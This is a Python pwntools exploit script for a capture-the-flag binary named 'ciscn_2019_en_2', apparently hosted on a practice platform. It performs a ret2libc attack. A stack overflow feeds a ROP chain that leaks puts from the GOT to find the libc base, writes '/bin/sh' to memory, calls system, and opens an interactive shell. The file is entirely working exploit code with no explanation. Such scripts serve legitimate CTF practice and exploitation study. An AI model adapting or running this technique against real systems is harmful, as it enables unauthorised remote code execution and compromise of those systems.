from pwn import *

context.log_level = "info"
LOCAL_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
REMOTE_LIBC = "./libc6_2.27-3ubuntu1_amd64.so"
REMOTE_ADDR = "node4.buuoj.cn"
REMOTE_PORT = 26918

elf = ELF("./ciscn_2019_en_2")
pop_rdi_ret = 0x0000000000400c83
ret = 0x00000000004006b9

if len(sys.argv) == 2:
    libc = ELF(LOCAL_LIBC)
    if sys.argv[1] == "l":
        sock = process(elf.path)
    elif sys.argv[1] == "d": # Debug
        gs = """
            break *encrypt+61
            break *encrypt+334
            continue
        """
        sock = gdb.debug(elf.path, gdbscript = gs)
else:
    libc = ELF(REMOTE_LIBC)
    sock = remote(REMOTE_ADDR, REMOTE_PORT)


def leak_libc_addr():
    global libc_base_addr
    sock.sendafter(b"Input your choice!\n", b"1\n")

    payload = b"A" * 0x58 
    payload += p64(pop_rdi_ret)
    payload += p64(elf.got["puts"])
    payload += p64(elf.plt["puts"])

    payload += p64(pop_rdi_ret)
    payload += p64(0x602200)
    payload += p64(elf.plt["gets"])

    payload += p64(elf.sym["_start"])
    sock.sendlineafter(b"Input your Plaintext to be encrypted\n", payload)
    sleep(0.5)
    _ = sock.recvline()
    _ = sock.recvline()
    puts_got_addr = u64(sock.recvline()[:-1].ljust(8, b"\x00"))
    log.success("puts_got_addr = " + hex(puts_got_addr))
    libc_base_addr = puts_got_addr - libc.sym["puts"]
    log.success("libc_base_addr = " + hex(libc_base_addr))

    sleep(0.5)
    sock.sendline(b"/bin/sh")

def attack():
    sock.sendafter(b"Input your choice!\n", b"1\n")

    payload = b"B" * 0x58 
    payload += p64(pop_rdi_ret)
    payload += p64(0x602200)
    payload += p64(ret)
    payload += p64(libc_base_addr + libc.sym["system"])
    sock.sendlineafter(b"Input your Plaintext to be encrypted\n", payload)

if __name__ == "__main__":
    leak_libc_addr()
    attack()
    sock.interactive()



